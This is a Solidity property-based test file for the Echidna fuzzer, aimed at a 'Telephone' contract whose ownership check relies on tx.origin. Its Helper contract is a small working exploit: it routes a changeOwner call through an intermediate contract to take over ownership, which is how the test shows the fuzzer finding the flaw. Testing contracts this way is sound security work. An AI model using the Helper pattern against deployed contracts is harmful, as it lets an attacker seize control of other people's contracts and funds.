// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "../src/Telephone.sol";

/**
 * @title TelephoneEchidna
 * @notice Property-based testing for Telephone contract using Echidna
 * @dev This demonstrates that Echidna CAN find tx.origin vulnerabilities when properly configured
 */
contract TelephoneEchidna {
    Telephone public telephone;
    address public immutable INITIAL_OWNER;
    
    // Helper contract to create intermediate calls
    Helper public helper;
    
    constructor() {
        telephone = new Telephone();
        INITIAL_OWNER = telephone.owner();
        helper = new Helper(address(telephone));
    }
    
    /**
     * @notice Property: Owner should never change (this WILL be violated)
     * @dev This property will FAIL when Echidna finds the vulnerability
     */
    function echidna_owner_unchanged() public view returns (bool) {
        return telephone.owner() == INITIAL_OWNER;
    }
    
    /**
     * @notice Property: Owner is never zero address
     * @dev Should generally pass unless specifically set to zero
     */
    function echidna_owner_never_zero() public view returns (bool) {
        return telephone.owner() != address(0);
    }
    
    /**
     * @notice Direct call to change owner (will fail due to tx.origin == msg.sender)
     * @param newOwner Address to attempt to set as owner
     */
    function callChangeOwnerDirectly(address newOwner) public {
        // This should fail because tx.origin == msg.sender in direct calls
        telephone.changeOwner(newOwner);
    }
    
    /**
     * @notice Call through helper contract (can succeed due to tx.origin != msg.sender)  
     * @param newOwner Address to set as owner
     * @dev This creates the vulnerability: tx.origin != msg.sender
     */
    function callChangeOwnerThroughHelper(address newOwner) public {
        // This can succeed because:
        // tx.origin = Echidna sender
        // msg.sender = helper contract address
        helper.changeOwnerViaHelper(newOwner);
    }
}

/**
 * @title Helper
 * @notice Helper contract to create tx.origin != msg.sender scenario
 */
contract Helper {
    Telephone public telephone;
    
    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }
    
    /**
     * @notice Change owner through this helper contract
     * @param newOwner New owner address
     * @dev When called, tx.origin != msg.sender, so vulnerability triggers
     */
    function changeOwnerViaHelper(address newOwner) external {
        telephone.changeOwner(newOwner);
    }
}